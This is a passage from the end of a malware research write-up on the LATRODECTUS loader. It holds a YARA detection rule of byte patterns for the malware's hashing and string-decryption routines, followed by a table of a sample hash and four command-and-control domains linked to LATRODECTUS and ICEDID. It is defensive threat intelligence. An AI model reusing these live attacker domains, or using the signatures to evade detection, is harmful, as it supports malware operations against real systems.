        $hwid_calc = { 48 89 4C 24 08 48 8B 44 24 08 69 00 0D 66 19 00 48 8B 4C 24 08 89 01 48 8B 44 24 08 8B 00 C3 }
        $string_decrypt = { 89 44 24 ?? 48 8B 44 24 ?? 0F B7 40 ?? 8B 4C 24 ?? 33 C8 8B C1 66 89 44 24 ?? 48 8B 44 24 ?? 48 83 C0 ?? 48 89 44 24 ?? 33 C0 66 89 44 24 ?? EB ?? }
        $campaign_fnv = { 48 03 C8 48 8B C1 48 39 44 24 08 73 1E 48 8B 44 24 08 0F BE 00 8B 0C 24 33 C8 8B C1 89 04 24 69 04 24 93 01 00 01 89 04 24 EB BE }
    condition:
        2 of them
}
```

## Observations

The following observables were discussed in this research.

| Observable | Type | Name | Reference |
| --- | --- | --- | --- |
| aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c | SHA-256 | TRUFOS.DLL | LATRODECTUS |
| aytobusesre.com | domain | | LATRODECTUS C2 |
| scifimond.com | domain | | LATRODECTUS C2 |
| gyxplonto.com | domain | | ICEDID C2 |
| neaachar.com | domain | | ICEDID C2 |

## References
The following were referenced throughout the above research:

 - [https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39)
 - [https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice](https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice)

## Tooling
[String decryption and IDA commenting tool](https://github.com/elastic/labs-releases/blob/main/tools/latrodectus/latro_str_decrypt.py)
